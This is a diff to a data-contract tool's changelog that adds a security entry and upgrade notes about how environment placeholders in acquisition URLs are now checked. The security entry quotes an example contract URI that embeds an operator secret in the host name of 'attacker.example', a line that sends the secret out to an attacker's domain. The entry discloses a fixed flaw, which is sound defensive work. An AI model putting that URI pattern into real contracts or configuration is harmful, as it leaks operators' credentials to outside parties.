@@ -89,6 +89,21 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
   For an upstream fetched from git, `$ref`s reach files inside the clone only, whatever
   `FLUID_REF_ROOT` or a workspace file in the clone say.
 
+### Security
+
+- **`{{ env.* }}` on the acquisition path no longer renders the operator's environment into a host
+  the contract chooses.** The dispatcher rendered every placeholder from the operator's
+  environment before the runner started, so `uri: https://{{ env.OPERATOR_SECRET }}.attacker.example/catalog`
+  sent the variable's value, in the host name, to whoever owns the domain (an Iceberg sink pushed
+  it as `iceberg.catalog.uri`). Now, for a string that is a URL or sits in a host field (`host`,
+  `uri`, `url`, `endpoint`, `server`, `server_url`, ...), read as written before anything is
+  expanded: a credential-shaped variable anywhere in it is refused; and any other variable in the
+  URL's authority is refused unless the operator pairs it with the host it makes, `NAME@host` in
+  `FLUID_ACQUISITION_SECRET_REF_ALLOWLIST` (a loopback host needs no entry). A variable that is the
+  whole host (`host: "{{ env.PGHOST }}"`, `https://{{ env.CATALOG_HOST }}/catalog`) needs no
+  pairing: the operator chose the address. The refusal names the variable and the field, never the
+  rendered value.
+
 ### Upgrade notes
 
 - **An unset or empty `{{ env.NAME }}` now stops the command.** A contract that relied on a
@@ -96,6 +111,11 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
   fails naming it: export the variable, or delete the placeholder. That includes a region written
   as `{{ env.AWS_REGION }}`, which deployed in the environment's own region when the variable was
   unset. `fluid validate` shows the same list as a warning ahead of time.
+- **Acquisition builds: a variable beside text in a URL's authority needs the operator's pairing.**
+  `https://{{ env.TENANT }}.db.example/x` or `{{ env.H }}@db.example` needs
+  `FLUID_ACQUISITION_SECRET_REF_ALLOWLIST=TENANT@<the host it renders to>` (or the bare variable
+  for any host) in the operator environment; a credential-shaped variable in a URL is refused:
+  give the credential to the connector as a secretRef. `host: "{{ env.PGHOST }}"` is unchanged.
 - **A split contract's digest changes once.** If an upstream keeps parts of its contract in `$ref`
   fragments, the digest that `fluid contract digest` prints, and that `fluid apply`'s federation
   gate computes, is now of the composed contract. Re-pin `consumes[].upstreamDigest` for such an
